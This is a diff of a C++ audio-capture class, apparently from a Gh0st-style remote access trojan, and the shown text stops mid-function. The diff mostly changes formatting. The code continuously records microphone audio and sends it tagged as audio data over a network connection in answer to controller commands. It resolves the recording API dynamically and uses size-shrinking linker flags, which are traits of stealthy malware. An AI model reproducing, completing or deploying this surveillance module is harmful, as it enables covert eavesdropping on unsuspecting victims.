@@ -1,11 +1,12 @@
 // MyAudioManager.cpp: implementation of the CMyAudioManager class.
 //
 //////////////////////////////////////////////////////////////////////
-
+#include "StdAfx.h"
 #include "MyAudioManager.h"
+#include "until.h"
 
-#pragma comment(lib,"msvcrt.lib")
-#pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98 /nodefaultlib:libcmt.lib")
+//#pragma comment(lib,"msvcrt.lib")
+//#pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98 /nodefaultlib:libcmt.lib")
 
 //////////////////////////////////////////////////////////////////////
 // Construction/Destruction
@@ -34,11 +35,11 @@ CMyAudioManager::~CMyAudioManager()
 	delete	m_lpAudio;
 }
 
-DWORD WINAPI CMyAudioManager::WorkThread( LPVOID lparam )
+DWORD WINAPI CMyAudioManager::WorkThread(LPVOID lparam)
 {
 	CMyAudioManager *pThis = (CMyAudioManager *)lparam;
 	while (pThis->m_bIsWorking)
-			pThis->sendRecordBuffer();
+		pThis->sendRecordBuffer();
 
 	return -1;
 }
@@ -46,8 +47,8 @@ DWORD WINAPI CMyAudioManager::WorkThread( LPVOID lparam )
 bool CMyAudioManager::Initialize()
 {
 	HINSTANCE winmm = LoadLibraryW(L"Winmm.dll");
-	
-	typedef UINT (WINAPI *WIND)(void); 
+
+	typedef UINT(WINAPI *WIND)();
 	WIND mywaveInGetNumDevs = (WIND)GetProcAddress(winmm, "waveInGetNumDevs");
 
 	if (!mywaveInGetNumDevs())
@@ -61,8 +62,8 @@ bool CMyAudioManager::Initialize()
 
 	m_bIsWorking = true;
 
-	if(winmm) FreeLibrary(winmm);
-		
+	if (winmm) FreeLibrary(winmm);
+
 	return true;
 }
 
@@ -71,21 +72,21 @@ int CMyAudioManager::sendRecordBuffer()
 	DWORD	dwBytes = 0;
 	UINT	nSendBytes = 0;
 	LPBYTE	lpBuffer = m_lpAudio->getRecordBuffer(&dwBytes);
-	
+
 	if (lpBuffer == NULL) return 0;
-	
+
 	LPBYTE	lpPacket = new BYTE[dwBytes + 1];
 	lpPacket[0] = TOKEN_AUDIO_DATA;
 	memcpy(lpPacket + 1, lpBuffer, dwBytes);
 
 	if (dwBytes > 0) nSendBytes = Send(lpPacket, dwBytes + 1);
-	
+
 	delete	lpPacket;
 
 	return nSendBytes;
 }
 
-void CMyAudioManager::OnReceive( LPBYTE lpBuffer, UINT nSize )
+void CMyAudioManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 {
 	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
 	{
